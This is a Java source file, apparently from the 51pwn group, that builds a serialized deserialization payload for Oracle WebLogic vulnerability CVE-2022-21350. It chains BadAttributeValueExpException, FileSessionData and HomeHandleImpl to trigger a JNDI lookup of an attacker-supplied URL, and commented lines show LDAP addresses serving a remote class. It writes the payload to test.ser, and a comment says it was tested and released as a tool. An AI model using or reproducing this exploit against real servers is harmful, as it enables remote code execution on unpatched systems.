package com._51pwn.CVE_2022_21350;

import weblogic.ejb.container.internal.BusinessHandleImpl;
import weblogic.ejb20.internal.HomeHandleImpl;
import weblogic.management.DeploymentException;
import weblogic.management.configuration.VirtualHostMBean;
import weblogic.management.configuration.VirtualTargetMBean;
import weblogic.protocol.ServerChannel;
import weblogic.servlet.internal.AttributeWrapper;
import weblogic.servlet.internal.HttpServer;
import weblogic.servlet.internal.session.FileSessionData;
import weblogic.servlet.internal.session.SessionData;
import weblogic.servlet.spi.HttpServerManager;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.naming.CompoundName;
import javax.naming.Name;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.Collection;
import java.util.Map;
import java.util.Properties;
import java.util.concurrent.ConcurrentHashMap;

/*
CVE-2022-21350 测试通过，发布了工具

BadAttributeValueExpException:readObject -> valObj.toString() -> FileSessionData.toString()
  -> FileSessionData.isDebuggingSession  ->  FileSessionData.getAttribute("wl_debug_session") == AttributeWrapper
   -> FileSessionData.getAttributeInternal ->
 -> FileSessionData.attributes：（ConcurrentHashMap）->  FileSessionData.addUpAttributesTo -> append(this.getAttribute(key))
-> FileSessionData.getAttributeInternal -> AttributeWrapperUtils.unwrapObject
 -> HomeHandleImpl.getEJBObject -> ctx.lookup(this.jndiName)

* */
public class Main {
    public static void main(String[] args) throws Exception {
        System.setProperty("sun.io.serialization.extendedDebugInfo", "false");
//        ServiceLocatorFactory.getInstance().create("weblogic",null);

        // 过this.isValid()
        // 构造HomeHandleImpl，sink点
        HomeHandleImpl homeHandle = new HomeHandleImpl();
        Reflections.setFieldValue(homeHandle, "serverURL", args[0]);
        // serverURLF.set(homeHandle, "t3://127.0.0.1:7001/");

        Properties props = new Properties();
//        Name name = new CompoundName("ldap://docker.for.mac.localhost:1389/UpX34defineClass", props);
        Name name = new CompoundName(args[0], props);
//        Name name = new CompoundName("ldap://192.168.10.253:1389/UpX34defineClass", props);
        Reflections.setFieldValue(homeHandle, "jndiName", name);

        // homeHandle设置到BusinessHandleImpl
        BusinessHandleImpl businessHandle = new BusinessHandleImpl();
        Reflections.setFieldValue(businessHandle, "homeHandle", homeHandle);

        AttributeWrapper attributeWrapper = new AttributeWrapper(businessHandle);
        attributeWrapper.setEJBObjectWrapped(true);

        Map map = new ConcurrentHashMap<String, Object>();
        map.put("wl_debug_session", attributeWrapper);

        SessionData sessionData = new FileSessionData();
        Reflections.setFieldValue(sessionData, "attributes", map);

//        Field attributesF = sessionData.getClass().getSuperclass().getDeclaredField("registry");
//        attributesF.setAccessible(true);
//        attributesF.set(sessionData, new HttpServerManagerImpl());
        Method[]fs = sessionData.getClass().getSuperclass().getDeclaredMethods();
        for( int i=0; i < fs.length; i++){
            if (fs[i].getName() == "getWebServerRegistry"){
                fs[i].setAccessible(true);
                Object obj = fs[i].invoke(sessionData);
                Object obj1 = new HttpServerManager(){
                    @Override
                    public boolean isProductionModeEnabled() {
                        return false;
                    }

                    @Override
                    public void startWebServers() {

                    }

                    @Override
                    public void stopWebServers() {

                    }

                    @Override
                    public HttpServer defaultHttpServer() {
                        return null;
                    }

                    @Override
                    public String fakeDefaultServerName() {
                        return null;
                    }

                    @Override
                    public boolean isDefaultHttpServer(HttpServer httpServer) {
                        return false;
                    }

                    @Override
                    public HttpServer getHttpServer(String s) {
                        return null;
                    }

                    @Override
                    public Collection<HttpServer> getHttpServers() {
                        return null;
                    }

                    @Override
                    public HttpServer getVirtualHost(String s, String s1) {
                        return null;
                    }

                    @Override
                    public HttpServer getVirtualHost(String s) {
                        return null;
                    }

                    @Override
                    public HttpServer getVirtualHost(ServerChannel serverChannel) {
                        return null;
                    }

                    @Override
                    public HttpServer getVirtualTarget(String s) {
                        return null;
                    }

                    @Override
                    public HttpServer findHttpServer(String s, String s1) {
                        return null;
                    }

                    @Override
                    public HttpServer findHttpServer(String s) {
                        return null;
                    }

                    @Override
                    public HttpServer initWebServer(VirtualHostMBean virtualHostMBean) throws DeploymentException {
                        return null;
                    }

                    @Override
                    public HttpServer deployPartitionWebServer(VirtualTargetMBean virtualTargetMBean) throws DeploymentException {
                        return null;
                    }

                    @Override
                    public void undeployPartitionWebServer(VirtualTargetMBean virtualTargetMBean) {

                    }

                    @Override
                    public void registerPartitionWebServer(VirtualTargetMBean virtualTargetMBean) throws DeploymentException {

                    }
                };//new HttpServerManagerImpl()
                Reflections.setFieldValue(obj, "httpServerManager", obj1);
            }
        }

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", sessionData);
        serialize(badAttributeValueExpException);
//        System.getProperties().put("jarName","CVE-2022-21350_powerBy_51pwn.jar");
//        com._51pwn.hktalent.CreatJar.main(args);
    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.flush();
            os.close();
            System.out.println("ok: test.ser");
        } catch (Throwable e) {
//            e.printStackTrace();
        }
    }
}